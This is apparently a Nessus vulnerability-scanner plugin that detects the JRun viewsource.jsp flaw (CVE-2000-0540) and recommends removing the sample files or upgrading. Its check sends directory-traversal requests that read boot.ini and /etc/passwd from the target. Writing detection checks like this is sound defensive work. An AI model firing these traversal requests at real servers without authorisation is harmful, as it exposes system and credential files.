#
# Updated by HDM <hdm@digitaloffense.net> to work for Unix servers
# (also, it seems that JRun runs as r00t on Solaris by default!)
#

#
# Thanks to Scott Clark <quualudes@yahoo.com> for testing this
# plugin and helping me to write a Nessus script in time for
# this problem
#

if(description)
{
 script_id(10444); 
 script_version ("$Revision: 1.14 $");
 script_bugtraq_id(1386);
 script_cve_id("CVE-2000-0540");
 name["english"] = "JRun's viewsource.jsp";

 
 script_name(english:name["english"]);
 
 desc["english"] = "
The CGI viewsource.jsp is installed.
This CGI allows an attacker to download any file
from the remote host, with the privileges of
the web server.

Solution: Remove the JSP sample files or upgrade to JRUN 2.3.3 or higher.
Risk factor : High
See also : http://www.macromedia.com/devnet/security/security_zone/asb00-15.html";



 script_description(english:desc["english"]);
 
 summary["english"] = "Determines the presence of the jrun flaw";
 
 script_summary(english:summary["english"]);
 
 script_category(ACT_GATHER_INFO);
 
 
 script_copyright(english:"This script was written by Renaud Deraison");

 family["english"] = "CGI abuses";
 family["francais"] = "Abus de CGI";

 script_family(english:family["english"], francais:family["francais"]);
 
 script_dependencie("find_service.nes", "no404.nasl");
 script_require_ports(8000);
 exit(0);
}

#
# The script code starts here
#


include("http_func.inc");



file[0] = "/../../../../../../../../../boot.ini";    res[0] = "boot loader";
file[1] = "/../../../../../../../../../etc/passwd";  res[1] = "root:";


port = get_kb_item("Services/www");
if(!port)port = 80;
if(!get_port_state(port)){ exit(0); }

function check_page(req, pat)
{
    str = http_get(item:req, port:port);
    soc = open_sock_tcp(port);
    if(soc)
    {
        send(socket:soc, data:str);
        r = http_recv(socket:soc);
	http_close_socket(soc);
       if(pat >< r)
            {
                security_hole(port:port);
                close(soc);
                exit(0);
            }
     }
    return(0);
}


for(i=0;file[i];i=i+1)
{
    req = string("/jsp/jspsamp/jspexamples/viewsource.jsp?source=", file[i]);
    pat = res[i];
    check_page(req:req, pat:pat);
}
